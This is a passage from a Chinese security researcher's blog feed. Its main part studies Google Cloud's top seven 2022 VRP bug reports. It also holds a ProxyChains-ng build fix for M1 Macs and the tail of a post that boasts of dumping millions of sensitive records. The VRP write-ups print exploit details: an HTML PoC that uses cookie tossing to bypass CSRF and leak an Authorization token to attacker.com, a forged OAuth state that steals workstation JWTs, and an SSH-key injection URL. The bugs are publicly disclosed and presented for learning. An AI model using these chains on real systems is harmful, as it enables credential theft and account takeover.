alt="image-20231122112644041"></p><p>使用该JWT，通过webpack提取到的api，访问后端API，拿下大量敏感信息，达千万量级，防止burp卡死，仅列出部分</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221408646.png" alt="image-20231122140805594"></p><h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>不断提升攻击面的广度与深度，是一名hacker的核心素养</p><p>攻防之中，拥有充足的经验，而又不陷入经验主义的迂腐，面对万难，而又不放弃思考，是出奇制胜的关键所在</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleCloudVrp-top7-2022-Study-and-Ideas</title>
      <link href="/2023/06/28/GoogleCloudVrp-top7-2022-Study-and-Ideas/"/>
      <url>/2023/06/28/GoogleCloudVrp-top7-2022-Study-and-Ideas/</url>
      
        <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>Google安全团队近期发布了2022年GoogleCloud VRP中赏金top7的漏洞</p><p><a href="https://security.googleblog.com/2023/06/google-cloud-awards-313337-in-2022-vrp.html?continueFlag=8d8e2a2b6ab56e4030b5b194ac3f4922">https://security.googleblog.com/2023/06/google-cloud-awards-313337-in-2022-vrp.html?continueFlag=8d8e2a2b6ab56e4030b5b194ac3f4922</a></p><blockquote><p><strong>1st Prize -</strong> $133,337: Yuval Avrahami for the report and write-up <a href="https://unit42.paloaltonetworks.com/gke-autopilot-vulnerabilities/">Privilege escalations in GKE Autopilot</a>. Yuval’s excellent write-up describes several attack paths that would allow an attacker with permission to create pods in an Autopilot cluster to escalate privileges and compromise the underlying node VMs. While these VMs are accessible to customers in GKE Standard, this research led to several <a href="https://cloud.google.com/anthos/clusters/docs/security-bulletins#gcp-2022-009">hardening improvements</a> in Autopilot that make it a better <a href="https://cloud.google.com/kubernetes-engine/docs/concepts/autopilot-security">secure-by-default</a> Kubernetes offering.</p><p><strong>2nd Prize -</strong> $73,331: Sivanesh Ashok and Sreeram KL for the report and write-up <a href="https://blog.stazot.com/ssh-key-injection-google-cloud/">SSH Key Injection on GCE</a>. Their write-up describes the journey of discovering a vulnerability that would allow an attacker to gain access to a user’s GCE VM by tricking them into clicking a link. They demonstrate the importance of persistence and turned a strange behavior in user creation into an injection of arbitrary SSH public keys.</p><p><strong>3rd Prize -</strong>  $31,337: Sivanesh Ashok and Sreeram KL for the report and write-up <a href="https://blog.stazot.com/auth-bypass-in-google-cloud-workstations/">Bypassing Authorization in Cloud Workstations</a>. Their write-up describes their research process for analyzing Cloud Workstations and then a full-chain exploit to steal a user’s access token by abusing the format of an OAuth state parameter.</p><p><strong>4th Prize -</strong> $31,311: Sreeram KL and Sivanesh Ashok for the report and write-up <a href="https://blog.geekycat.in/client-side-ssrf-to-google-cloud-project-takeover/">Client-Side SSRF to Google Cloud Project Takeover</a>. Their write-up combines a client-side SSRF, a CSRF bypass, and a clever 3xx redirect by “deactivating” a Feedburner proxy. An attacker could use this vulnerability to steal a Vertex AI user’s access token by tricking them into clicking a link.</p><p><strong>5th Prize -</strong> $17,311: Yuval Avrahami and Shaul Ben Hai for the report and write-up <a href="https://www.paloaltonetworks.com/apps/pan/public/downloadResource?pagePath=/content/pan/en_US/resources/whitepapers/kubernetes-privilege-escalation-excessive-permissions-in-popular-platforms">Kubernetes Privilege Escalation: Excessive Permissions in Popular Platforms</a>. Their whitepaper covers privilege escalation vectors in Kubernetes and describes vulnerabilities in many Kubernetes hosting providers, including Azure’s AKS, Amazon’s EKS, and GKE.</p><p><strong>6th Prize -</strong> $13,373: Obmi for the report and write-up <a href="https://obmiblog.blogspot.com/2022/12/gcp-2022-few-bugs-in-google-cloud-shell.html">A Few Bugs in the Google Cloud Shell</a>. Obmi discovered vulnerabilities in the Cloud Shell file upload functionality that would have allowed an attacker to write arbitrary files to a user’s Cloud Shell via cross-site request forgery.</p><p><strong>7th Prize -</strong> $13,337: Bugra Eskici for the report and write-up <a href="https://bugra.ninja/posts/cloudshell-command-injection/">Command injection in Cloud Shell</a>. Bugra found a very curious injection point in a Cloud Shell script that led to a URL query parameter being directly injected into a Python script. This vulnerability would have given an attacker arbitrary code execution in a user’s Cloud Shell if they clicked on an attacker-controlled link.</p></blockquote><p>本人根据google官方给出的YouTube视频进行了学习,并且根据个人理解对其中的案例细节进行了解释以及思路总结，本文配图均来源于google官方视频与writeup</p><p>能力水平有限，如有谬误，欢迎大家指出</p><p>Google官方视频：<a href="https://youtu.be/uOvizKc1WZY">https://youtu.be/uOvizKc1WZY</a></p><p>现将TOP 7漏洞案例学习与思考归纳总结如下</p><h2 id="7th-Prize-Command-injection-in-Cloud-Shell-￥13337"><a href="#7th-Prize-Command-injection-in-Cloud-Shell-￥13337" class="headerlink" title="7th Prize: Command injection in Cloud Shell - ￥13337"></a>7th Prize: Command injection in Cloud Shell - ￥13337</h2><p>这个站说来惭愧，笔者曾经挖Google VRP的时候也挖过，是一个基于CSRF的command Injection，触发起来比较困难，google安全团队认为这比较鸡肋，因此没有收取漏洞</p><p>但是老外却搞到了一个真正的command injection。。让我羡慕不已</p><p>在GoogleCloud的web editor中，内置了shell，而url中的project参数似乎总会出现在python config脚本中，并且会引发脚本执行</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271234324.png" alt="image-20230627123429297"></p><p>如上图所示，单引号触发了一个python console error </p><p>那么接下来事情就很简单了，根据目标的闭合feature构造一个oneline命令执行即可</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271240994.png" alt="image-20230627124005960"></p><h3 id="漏洞发掘的思考点："><a href="#漏洞发掘的思考点：" class="headerlink" title="漏洞发掘的思考点："></a><strong>漏洞发掘的思考点：</strong></h3><p><strong>永远不要放过任何一个用户可控的参数点~</strong></p><h2 id="6th-Prize-A-Few-Bugs-in-the-Google-Cloud-Shell-￥13337"><a href="#6th-Prize-A-Few-Bugs-in-the-Google-Cloud-Shell-￥13337" class="headerlink" title="6th Prize: A Few Bugs in the Google Cloud Shell - ￥13337"></a>6th Prize: A Few Bugs in the Google Cloud Shell - ￥13337</h2><p>漏洞发现者找到了一个基于文件上传的XSS</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271244864.png" alt="image-20230627124440839"></p><p>但是这样触发只是一个self xss，并不符合VRP的收录规则，但是漏洞发现者又通过非常Cool的姿势，发现了此处的CSRF</p><p>在本处要实现文件上传处的CSRF，需要获得一个随机的id，但是很显然，这个id并不容易猜解获取</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271248251.png" alt="image-20230627124856216"></p><p>于是漏洞发掘者构造了一个POC，在拖拽图片时可以获取到目标带有这个随机id的文件上传url，从而实现CSRF，进而触发XSS</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271247346.png" alt="image-20230627124728387"></p><p>如下图所示，拖拽这个image，可以获取到这个随机id</p><p>进而完成获取id-&gt;文件上传csrf-&gt;实现XSS的攻击链</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271252333.png" alt="image-20230627125239304"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271253623.png" alt="image-20230627125308590"></p><p>不得不说，这一整套利用链非常amazing</p><h3 id="漏洞发掘的思考点：-1"><a href="#漏洞发掘的思考点：-1" class="headerlink" title="漏洞发掘的思考点："></a><strong>漏洞发掘的思考点：</strong></h3><p>1.Self XSS结合CSRF变废为宝</p><p>2.在某些存在<strong>unique id</strong>的情况下，可考虑通过一些类似于经典的”<strong>click hijacking</strong>“方式，获取看似攻击者无法获取到的讯息</p><h2 id="5th-Prize-Kubernetes-Privilege-Escalation-Excessive-Permissions-in-Popular-Platforms-17-311"><a href="#5th-Prize-Kubernetes-Privilege-Escalation-Excessive-Permissions-in-Popular-Platforms-17-311" class="headerlink" title="5th Prize: Kubernetes Privilege Escalation: Excessive Permissions in Popular Platforms - $17,311"></a>5th Prize: Kubernetes Privilege Escalation: Excessive Permissions in Popular Platforms - $17,311</h2><p>这个漏洞比较特殊，与其说叫漏洞，不如说叫安全白皮书~</p><p>白皮书并没有直接描述漏洞或者安全问题，但是其揭示了诸多提供Kubernetes服务的公有云厂商在pods失陷后与特权下的”DaemonSets”容器产生的权限提升的火花，并给出了kubernetes权限配置安全合理性的检测工具</p><p>Google认为这对于Kubernetes生态有所裨益，因此给出了$17311的奖励</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271300155.png" alt="image-20230627130025127"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271258692.png" alt="image-20230627125847654"></p><p>白皮书链接：</p><p><a href="https://www.paloaltonetworks.com/apps/pan/public/downloadResource?pagePath=/content/pan/en_US/resources/whitepapers/kubernetes-privilege-escalation-excessive-permissions-in-popular-platforms">https://www.paloaltonetworks.com/apps/pan/public/downloadResource?pagePath=/content/pan/en_US/resources/whitepapers/kubernetes-privilege-escalation-excessive-permissions-in-popular-platforms</a></p><h3 id="漏洞发掘的思考点：-2"><a href="#漏洞发掘的思考点：-2" class="headerlink" title="漏洞发掘的思考点："></a><strong>漏洞发掘的思考点：</strong></h3><p><strong>对于一个项目安全生态有所裨益的产出，往往比单点漏洞拥有更高的普适性价值</strong></p><h2 id="4th-Prize-Client-Side-SSRF-to-Google-Cloud-Project-Takeover-31-311"><a href="#4th-Prize-Client-Side-SSRF-to-Google-Cloud-Project-Takeover-31-311" class="headerlink" title="4th Prize: Client-Side SSRF to Google Cloud Project Takeover - $31,311"></a><strong>4th Prize: Client-Side SSRF to Google Cloud Project Takeover -</strong> $31,311</h2><p>这个漏洞的发掘team同样是3th,2th奖励的发现者，可谓是神雕侠侣了。。。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271336814.png" alt="image-20230627133641772"></p><p>漏洞发掘者在pentest中发现了如下的URL：</p><blockquote><p>https:&#x2F;&#x2F;{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com&#x2F;aipn&#x2F;v2&#x2F;proxy&#x2F;<strong>compute.googleapis.com</strong>&#x2F;something</p></blockquote><p>感觉这个点可能存在SSRF后使用了自己的域名进行测试</p><blockquote><p>https:&#x2F;&#x2F;{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com&#x2F;aipn&#x2F;v2&#x2F;proxy&#x2F;<strong>geekycat.in</strong>&#x2F;something</p></blockquote><p>但是并不奏效，于是用了一个简单的tips bypass了限制</p><blockquote><p><code>https://&#123;INSTANCE-ID&#125;-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/&#123;attacker.com&#125;/compute.googleapis.com/</code> </p><p><strong>来自作者：bypasses the check, that was easy 😅</strong></p></blockquote><p>接下来作者服务器的日志显示，它收到了header中带有Authorization token的请求。</p><p>随后验证了Authorization token，发现确实有云平台权限~</p><p>至此实现权限接管</p><p>google随后修复了这个漏洞，只允许这个点请求*.google.com，但是漏洞发掘者找到了Bypass的方法</p><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>漏洞发掘者随后发现了一个谷歌的子域服务 <code>https://feedburner.google.com</code>. </p><p>该服务允许可以管理域名下的RSS提要。类似于RSS Proxy一样。</p><p>随后漏洞挖掘者通过以下方法视图构建OpenRedirect</p><ul><li>导航至<code>https://feedburner.google.com</code>–&gt; 创建代理 –&gt; 输入<code>https://attacker.com/rss.xml</code></li><li>使用“自定义 URL”–&gt; 创建</li></ul><p>复制的 URL 的格式如下：<code>https://feeds.feedburner.com/&#123;CUSTOM&#125;/&#123;ID&#125;</code></p><ul><li>创建代理后，单击三个点 –&gt; 停用 –&gt; 确认</li></ul><p>现在，受害者访问<code>https://feeds.feedburner.com/&#123;CUSTOM&#125;/&#123;ID&#125;</code>将会实现一个OpenRedirect</p><p>但是并不是一帆风顺的</p><p>访问<code>https://&#123;INSTANCE-ID&#125;-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/&#123;CUSTOM&#125;/&#123;ID&#125;</code></p><p>无法实现SSRF，因为Google实施了CSRF保护。</p><p>随后漏洞发掘者注意到Jupyter notebook是部署在tornado上的，而tornado有一种绕过csrf校验的方法：</p><blockquote><p>Tornado服务器会比较GET参数&#x2F;POST包中的CSRF令牌与cookie中的CSRF令牌。</p><p>如果两者都匹配，则通过。否则，失败。</p><p><strong>由于子域可以将cookie设置为父域，因此在任何子域中执行javascript将允许我们为cookie设置任意CSRF令牌，然后绕过CSRF保护。</strong></p></blockquote><p>于是漏洞挖掘者在googleusercontent.com部署了一个jupyter</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271428761.png" alt="image-20230627142813741"></p><p>并且修改了Jupyter笔记本的索引页(位于&#x2F;opt&#x2F;conda&#x2F;share&#x2F; Jupyter &#x2F;lab&#x2F;static下)</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271428358.png" alt="image-20230627142804323"></p><p>由于已经成功地获得了javascript的执行权，我们现在可以设置任意的CSRF令牌并绕过保护。</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;body&gt;    &lt;script&gt;        var base_domain = document.domain.substr(document.domain.indexOf(&#39;.&#39;));        document.cookie=&#39;_xsrf=1;Domain=&#39;+base_domain;fetch(&quot;https://&#123;VICTIM-INSTANCE-ID&#125;-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/&#123;CUSTOM&#125;/&#123;ID&#125;?_xsrf=1&quot;,&#123;credentials:&quot;include&quot;,mode:&quot;no-cors&quot;&#125;)    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>进而获取Authorization header，漏洞利用完成~</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306271428288.png" alt="image-20230627142855242"></p><h3 id="漏洞发掘的思考点：-3"><a href="#漏洞发掘的思考点：-3" class="headerlink" title="漏洞发掘的思考点："></a><strong>漏洞发掘的思考点：</strong></h3><p>这个漏洞是我认为bypass最为精妙的一个，学到的有以下几点：</p><p>1.tornado的csrf校验bypass feature</p><p>2.当厂商在SSRF点限制了自己的根域名后，可以考虑从子域的业务点入手挖掘一个OpenRedirect，在支持302跳转的情况下往往会产生意想不到的效果</p><h2 id="3rd-Prize-Bypassing-Authorization-in-Cloud-Workstations-31337"><a href="#3rd-Prize-Bypassing-Authorization-in-Cloud-Workstations-31337" class="headerlink" title="3rd Prize: Bypassing Authorization in Cloud Workstations - $31337"></a>3rd Prize: Bypassing Authorization in Cloud Workstations - $31337</h2><p>这个漏洞比较麻烦，是一个Outh层面的漏洞，Outh中经典的往往是控制redirect url实现凭据劫持</p><p>但是这个点稍微多了点步骤，要先获取到受害者outh的url再进行构造才能实现凭据劫持，因此直接给出作者的Attack Chain供大家参考</p><blockquote><ol><li><p><strong>访问{victim-subdomain}.cloudworkstations.dev</strong></p></li><li><p><strong>被重定向到并给出 500 响应<code>https://ssh.cloud.google.com/devshell/oauth?authuser=0&amp;state=&#123;state-value&#125;</code></strong></p></li><li><p><strong>state参数为base64加密的字符串，解密后数据实例如下</strong></p><pre><code class="json">&#123;&quot;token&quot;:&quot;random-token&quot;,&quot;target_host&quot;:&quot;attacker.com/80-&#123;workstation-name&#125;.cluster-&#123;random-string&#125;.cloudworkstations.dev&quot;,&quot;authuser&quot;:&quot;&quot;,&quot;workstation_name&quot;:&quot;projects/project-name-374312/locations/us-central1/workstationClusters/cluster-name/workstationConfigs/config-name/workstations/workstation-name&quot;,&quot;workstation_consumer_project_number&quot;:&quot;0123456789&quot;&#125;</code></pre><p><strong>从base64解码状态参数，并将target_host值更改为<code>attacker.com/&#123;victim-subdomain&#125;.cloudworkstations.dev</code></strong></p></li><li><p><strong>将 JSON 重新编码为 base64 并创建新的状态值</strong></p></li><li><p><strong>使用修改后的状态值制作 OAuth URL -并将恶意链接发送给受害者<code>https://ssh.cloud.google.com/devshell/oauth?authuser=0&amp;state=&#123;malicious-state-value&#125;</code></strong></p></li><li><p><strong>一旦受害者打开恶意链接，攻击者就会收到对其服务器的 GET 请求，该请求将具有 workstation_jwt 值。</strong></p></li><li><p><strong>然后，攻击者使用受害者的凭据并访问受害者的工作站<code>https://&#123;victim-subdomain&#125;.cloudworkstations.dev/_workstation/login?redirect=&#123;state-value&#125;&amp;workstation_jwt=&#123;victim-jwt-value&#125;</code></strong></p></li></ol></blockquote><h3 id="漏洞发掘的思考点：-4"><a href="#漏洞发掘的思考点：-4" class="headerlink" title="漏洞发掘的思考点："></a><strong>漏洞发掘的思考点：</strong></h3><p>1.多多留意一些弱加密的参数值，往往隐藏着不为人知的秘密</p><p>2.Outh漏洞中openRedirect导致的凭据劫持不一定就是写脸上的redirectUrl可控~尽量去发掘可控的redirect参数点，针对实战情况再进行bypass</p><h2 id="2nd-Prize-SSH-Key-Injection-on-GCE-73-331"><a href="#2nd-Prize-SSH-Key-Injection-on-GCE-73-331" class="headerlink" title="2nd Prize: SSH Key Injection on GCE - $73,331"></a><strong>2nd Prize: SSH Key Injection on GCE -</strong> $73,331</h2><p>漏洞发掘者在google cloud的<em>Google</em> Compute Engine（GCE）的instance添加SSH Key时，使用了形如</p><pre><code>curl https://stazot.com</code></pre><p>的payload</p><p>但是却出现了如下图所示的奇葩输出</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280909736.png" alt="img"></p><p>漏洞发掘者瞬间天灵盖炸开，原来冒号:会被当成这个点的分隔符号。</p><p>冒号前的作为username，冒号后作为ssh key，并且这一切都是通过get方式进行传参的</p><p>因此，漏洞发掘者准备构造URL，让受害者打开恶意链接会将攻击者的用户名和 SSH 密钥添加到他们的计算实例中。</p><p>以下 URL attacker:{URL-ENCODED-SSH-PUBLIC-KEY} 作为Exploit处：</p><pre><code>https://ssh.cloud.google.com/v2/ssh/projects/&#123;PROJECT-NAME&#125;/zones/&#123;INSTANCE-ZONE&#125;/instances/&#123;INSTANCE-NAME&#125;?newLinuxUsername=attacker:&#123;URL-ENCODED-SSH-PUBLIC-KEY&#125;</code></pre><p>以受害者身份打开链接 - 但是，它没有奏效。</p><p>原因是添加的SSH密钥随后附加了Google在后端自动生成的SSH密钥。</p><p>为了解决这个问题，漏洞发掘者在有效负载后附加了换行符%0d%0a返回字符：</p><pre><code>https://ssh.cloud.google.com/v2/ssh/projects/&#123;PROJECT-NAME&#125;/zones/&#123;INSTANCE-ZONE&#125;/instances/&#123;INSTANCE-NAME&#125;?newLinuxUsername=attacker:&#123;URL-ENCODED-SSH-PUBLIC-KEY&#125;%0d%0a</code></pre><p>成功绕过了限制</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280919652.png" alt="image-20230628091912594"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280922300.png" alt="image-20230628092202263"></p><p>至此实现了一个奇葩情况下产生奇迹的RCE</p><h3 id="漏洞发掘的思考点：-5"><a href="#漏洞发掘的思考点：-5" class="headerlink" title="漏洞发掘的思考点："></a><strong>漏洞发掘的思考点：</strong></h3><p>1.测试公有云厂商时，多多留意带有高危操作的功能点，诸如实例用户添加，SSH Key添加的功能点，一但出洞，便是惊涛骇浪</p><p>2.在某些情况下可尝试使用%0d%0a等control chars毙掉程序后端自动生成的内容，让我们的漏洞触发点构造与利用更加一帆风顺</p><h2 id="1st-Prize-Privilege-escalations-in-GKE-Autopilot-133-337"><a href="#1st-Prize-Privilege-escalations-in-GKE-Autopilot-133-337" class="headerlink" title="1st Prize: Privilege escalations in GKE Autopilot - $133,337"></a>1st Prize: Privilege escalations in GKE Autopilot - $133,337</h2><p>终于来到了top1的vuln（<a href="https://unit42.paloaltonetworks.com/gke-autopilot-vulnerabilities/%EF%BC%89">https://unit42.paloaltonetworks.com/gke-autopilot-vulnerabilities/）</a></p><p>在这个漏洞中，漏洞发掘者挖掘了数条攻击路径，这些路径允许有权在 Autopilot 集群中创建 Pod 的攻击者提升权限并破坏底层节点虚拟机。</p><p>Autopilot架构的简化图如图。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280950966.png" alt="A simplified diagram of Autopilot&#39;s architecture. Components unique to Autopilot are colored in green and shown with a number corresponding to their role from the list above. Unlike GKE Standard, where nodes are visible as Compute Engine VMs, Autopilot nodes are completely managed by Google, thus colored in green."></p><p>Autopilot 特有的组件以绿色显示，并显示与上面列表中的角色对应的数字。</p><p>与 GKE Standard 不同，其中节点显示为计算引擎虚拟机，Autopilot 节点完全由 Google 管理，因此显示为绿色。</p><p>Autopilot内置了安全策略防止运行Privileged Container，同时阻止用户访问由 Google 管理的群集组件（如节点）; 防止用户访问由 Google 管理的群集组件（如节点），以防止容器逃逸和其他攻击面</p><p>如作者给出的图所示</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280955294.png" alt="image-20230628095555233"></p><p>但是作者依然给出了一些可能的攻击面</p><ol><li><p>GoogleCloud依靠 Autopilot 的策略来防止有风险的配置。</p><p>如果攻击者可以以某种方式绕过该策略，他们可能会通过客户期望被阻止的方法（例如部署特权容器）来提升权限。</p></li><li><p>Autopilot 管理员没有完全特权，受内置策略的限制，无法访问节点和某些特权 Kubernetes API。</p><p>如果攻击者可以绕过Autopilot的策略，他们可能会获得比管理员更高的权限，从而为隐形后门打开大门。</p></li></ol><h3 id="第一条攻击链"><a href="#第一条攻击链" class="headerlink" title="第一条攻击链"></a>第一条攻击链</h3><p>Autopilot 禁止可能允许容器逃逸的 Pod 配置。为了支持一些特殊的node访问的附加组件，Autopilot 创建了一个允许列表workloads的概念。如果容器与允许列出的workloads匹配，则允许它使用允许列表工作负载配置中指定的特权功能。漏洞挖掘者测试时，唯一列入允许列表的workloads是 Datadog agent</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281001176.png" alt="In June, the only allow-listed workloads were Datadog agents."></p><p>下面是引起漏洞发掘者注意的其中一个 Datadog agent的allowListedworkLoads配置。如果容器指定了列出的命令和映像，则允许它在只读卷中装载列出的主机路径。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281003231.png" alt="The screenshot shows the allow-listed workload configuration for one of the Datadog agents that caught our attention while searching for GKE Autopilot vulnerabilities. "></p><p>这里的安全问题是校验不充分。仅检查命令和映像不足以确保容器运行 Datadog 代码。</p><p>使用以下 PodSpec，容器可以在运行攻击者控制的代码时伪装成 Datadog agent，并滥用暴露的主机卷进行破坏。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281006198.png" alt="Using the PodSpec shown here, a container can masquerade as the Datadog agent while running attacker-controlled code, and abuse the exposed host volumes to break out."></p><p>在下面作者给出的视频中，恶意用户部署了一个伪装成 Datadog 代理的容器。Pod 通过以下步骤接管其底层节点：</p><ol><li>滥用挂载的 containerd socket来创建挂载主机文件系统的特权容器。</li><li>让该特权容器安装一个 systemd 服务，该服务会让node派生一个反向shell给攻击者</li></ol><p><a href="https://youtu.be/0cZJklJxTQk">https://youtu.be/0cZJklJxTQk</a></p><h3 id="第二条攻击链"><a href="#第二条攻击链" class="headerlink" title="第二条攻击链"></a>第二条攻击链</h3><p>第二条攻击路径涉及的概念较多</p><p>简而言之的话，漏洞发掘者开发了一个 Python 工具，可将 Pod 的服务帐户映射到它们的 Kubernetes 权限（即角色和集群角色）名为sa-hunter 。</p><p>通过该工具，漏洞挖掘者发现默认安装了两个功能强大的 kube-system pod：<strong>stackdriver-metadata-agent-cluster-level</strong> <strong>和 metrics-server</strong>。两个 Pod 都可以更新现有部署。</p><p>乍一看，此权限可能看起来是无辜的，但足以权限提升到cluster admin。同时这些 Pod 也默认部署在GKE Standard中，这使得以下权限提升技术与所有 GKE 集群（<strong>GKE clusters, Standard and Autopilot</strong>）相关。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281013990.png" alt="Privileged role assigned to the metrics-server pod can update deployments."></p><p>后续获取并攻击服务账户token的攻击路径作者原文描述如下</p><blockquote><p>After taking over a node hosting either the stackdriver-metadata-agent-cluster-level or metrics-server pod, an attacker can harvest their service account token from the node filesystem. Armed with that token, the attacker can attain the privileges of any service account in the cluster with three simple steps:</p><ol><li><p>Update an existing deployment’s service account to the target service account. There are a number of preinstalled deployments, any one of which can be used for this step.</p></li><li><p>Add a malicious container to that deployment.</p></li><li><p>Have that malicious container retrieve the target service account token mounted in the container at &#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token.</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281018381.png" alt="Abusing deployment update privileges to obtain any service account&#39;s token."></p></li></ol></blockquote><p>kube-system namespace提供了许多预安装的、功能极其强大的服务帐户可选择。clusterrole-aggregation-controller (CRAC） 服务帐户可能是主要候选帐户，因为它可以向现有群集角色添加任意权限。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281020487.png" alt="The clusterrole-aggregation-controller service account can escalate cluster roles."></p><p>获取 CRAC 令牌后，攻击者可以更新绑定到 CRAC 的集群角色以拥有所有权限。此时，攻击者实际上是集群管理员，并且不受 Autopilot 策略的约束</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281022460.png" alt="image-20230628102225402"></p><p>作者给出的POC视频如下：</p><p><a href="https://youtu.be/4Dddhk1QclY">https://youtu.be/4Dddhk1QclY</a></p><h3 id="漏洞发掘的思考点：-6"><a href="#漏洞发掘的思考点：-6" class="headerlink" title="漏洞发掘的思考点："></a><strong>漏洞发掘的思考点：</strong></h3><p>1.测试集群服务时，多多关注集群服务中允许以特权模式运行的POD</p><p>2.多多留意集群服务中preinstalled service的权限误配</p><h2 id="后言："><a href="#后言：" class="headerlink" title="后言："></a>后言：</h2><p>通过以上七个精妙的漏洞的学习与思考总结，不由得慨叹：老外顶级的漏洞挖掘者功底之扎实，思路之风骚，我们还有很长的路要走</p><p>博采天下众长，攘天下之学识为我所用——是新时代优秀hacker与geeker的能力标配</p>]]></content>
      
      
      <categories>
          
          <category> 议题学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 议题学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac M1 Ventura解决ProxyChains-ng无法正常使用</title>
      <link href="/2023/04/24/Mac-M1-Ventura%E8%A7%A3%E5%86%B3ProxyChains-ng%E5%AE%89%E8%A3%85%E5%A4%B1%E8%B4%A5/"/>
      <url>/2023/04/24/Mac-M1-Ventura%E8%A7%A3%E5%86%B3ProxyChains-ng%E5%AE%89%E8%A3%85%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-踩坑"><a href="#0x00-踩坑" class="headerlink" title="0x00 踩坑"></a>0x00 踩坑</h2><p>在Mac M1芯片Ventura系统中直接通过brew安装Proxychains-ng会因为Ventura系统Bug</p><p>导致libproxychains4.dylib文件无法正常加载</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304242141369.png" alt="image-20230424214130990"></p><p>Github找issue和采用百度来的编译方法均无法解决，怀疑是系统层的Bug</p><p>经过折腾，成功找了解决方案，开个文章记录一下</p><h2 id="0x01-解决过程"><a href="#0x01-解决过程" class="headerlink" title="0x01 解决过程"></a>0x01 解决过程</h2><pre><code># 恢复模式关闭sipcsrutil disable# 打开arm64e支持sudo nvram boot-args=-arm64e_preview_abi随后重启Mac</code></pre><p>重启mac后</p><pre><code>git clone https://github.com/rofl0r/proxychains-ng cd proxychains-ng CFLAGS=&quot;-arch arm64e&quot; LDFLAGS=&quot;-arch arm64e&quot; ./configure --prefix=/usr/local --bindir=/usr/local/bin --libdir=/usr/local/lib --fat-binary-m1  //编译arm64e适用于M1芯片的软件包make</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304242145053.png" alt="image-20230424214510023"></p><p>如图</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304242145249.png" alt="image-20230424214557223"></p><pre><code>proxychains4 curl https://www.youtube.com</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304242147877.png" alt="image-20230424214709855"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/04/19/hello-world/"/>
      <url>/2023/04/19/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Blog迁移到Github纪念日</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023年初感悟与重生之我是赏金猎人合订本</title>
      <link href="/2023/04/05/2023%E5%B9%B4%E5%88%9D%E6%84%9F%E6%82%9F%E4%B8%8E%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA%E5%90%88%E8%AE%A2%E6%9C%AC/"/>
      <url>/2023/04/05/2023%E5%B9%B4%E5%88%9D%E6%84%9F%E6%82%9F%E4%B8%8E%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA%E5%90%88%E8%AE%A2%E6%9C%AC/</url>
      
